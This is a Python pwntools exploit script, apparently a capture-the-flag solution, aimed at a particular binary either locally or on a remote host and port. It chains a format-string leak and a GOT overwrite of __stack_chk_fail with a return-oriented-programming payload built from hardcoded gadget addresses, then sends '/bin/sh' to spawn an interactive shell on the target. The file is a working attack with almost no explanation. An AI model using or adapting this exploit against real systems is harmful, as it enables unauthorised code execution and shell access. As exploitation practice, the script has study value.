import sys
import logging
from pwn import *
logging.basicConfig(level=logging.INFO, format="%(message)s")
#logging.disable(logging.CRITICAL)

if len(sys.argv) == 2:
    program_name = sys.argv[1]
    target = process(program_name)
    logging.info("***local exploit ***")

else:
    HOST = sys.argv[1]
    PORT = int(sys.argv[2])
    logging.info("***remote exploit ***")
    logging.info("[*]target host : " + HOST)
    logging.info("[*]target port : " + str(PORT))
    target = remote(HOST, PORT)

###address###

bss_writable = 0x404040

#stack_addr = 0x7fffffffde50
stack_chk_fail_GOT_addr = 0x404018
ret_addr = 0x401256

readn = 0x401146
iso_sacnf_plt = 0x401040
pop_rdi = 0x00000000004012c3
pop_rsi_r15 = 0x00000000004012c1
pop_rbp = 0x000000000040112d
syscall = 0x000000000040118f

###main###
def main():
    ###payload###
    _ = input()
    payload = b"%8$s %1$s"
    payload = payload.ljust(0x10, b'\0')
    payload += p64(stack_chk_fail_GOT_addr)
    #payload += p64(stack_addr)
    target.sendline(payload)
    _ = input()

    payload2 = p64(ret_addr)
    target.sendline(payload2)

    payload3 = b"A" * 17
    payload3 += p64(pop_rdi)
    payload3 += p64(bss_writable)
    payload3 += p64(pop_rsi_r15)
    payload3 += p64(245)
    payload3 += p64(0)
    payload3 += p64(readn)

    #payload3 += p64(pop_rdi)
    #payload3 += p64(bss_writable + 8)
    #payload3 += p64(pop_rsi_r15)
    #payload3 += p64(118)
    #payload3 += p64(0)
    #payload3 += p64(readn)

    payload3 += p64(pop_rdi)
    payload3 += p64(bss_writable + 8)
    payload3 += p64(pop_rsi_r15)
    payload3 += p64(bss_writable + 128)
    payload3 += p64(0)
    #payload3 += p64(pop_rbp)
    #payload3 += p64(0x7fffffffde98)
    payload3 += p64(iso_sacnf_plt)

    payload3 += p64(pop_rdi)
    payload3 += p64(bss_writable + 236 + 1)
    payload3 += p64(pop_rsi_r15)
    payload3 += p64(0)
    payload3 += p64(0)
    payload3 += p64(syscall)

    target.sendline(payload3)
    _ = input()

    #target.send(b"/bin/sh\x00")
    target.sendline(b"%1$d" * 59 + b"\x00/bin/sh\x00")
    _ = input()
    target.sendline(b" ".join([b"0"] * 59))

    target.interactive()


if __name__ == "__main__":
    main()